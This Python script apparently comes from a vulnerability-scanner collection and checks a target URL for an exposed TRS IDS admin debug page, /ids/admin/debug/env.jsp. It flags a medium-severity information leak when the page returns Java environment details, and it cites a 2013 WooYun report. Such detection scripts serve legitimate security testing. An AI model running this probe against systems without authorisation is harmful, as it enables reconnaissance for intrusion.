#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS ids身份认证信息泄露
referer: http://www.wooyun.org/bugs/wooyun-2013-039729
author: Lucifer
description: 敏感信息泄露。
'''
import sys
import requests
import warnings
from termcolor import cprint

class trs_ids_auth_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/ids/admin/debug/env.jsp"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"JavaHome" in req.text and r"java.runtime.name" in req.text and r"java.vm.version" in req.text:
                cprint("[+]存在TRS ids身份认证信息泄露漏洞...(中危)\tpayload: "+vulnurl, "yellow")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = trs_ids_auth_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()
